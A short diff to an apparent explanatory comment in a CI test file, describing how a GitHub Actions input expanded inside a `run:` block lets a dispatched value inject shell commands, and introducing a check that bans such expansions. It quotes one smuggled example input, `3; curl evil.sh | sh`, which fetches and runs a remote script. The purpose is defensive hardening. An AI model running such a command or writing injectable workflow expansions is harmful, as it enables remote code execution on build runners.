@@ -3,8 +3,9 @@
 `${{ inputs.week }}` written inside a `run:` block is expanded by the runner
 BEFORE the shell parses the script, so whatever was typed into the dispatch
 box is spliced into a command line. `3; curl evil.sh | sh` is a legal string
-in that box. The repository is private and only the owner can dispatch it,
-which lowers the odds and changes nothing about the mechanism.
+in that box. Only a collaborator can dispatch it (the repository being
+public changes who can read, not who can run), which lowers the odds and
+changes nothing about the mechanism.
 
 Two things are pinned here. First, textually: no `run:` block in any workflow
 may contain a `${{ ... }}` expansion at all — the same check a workflow
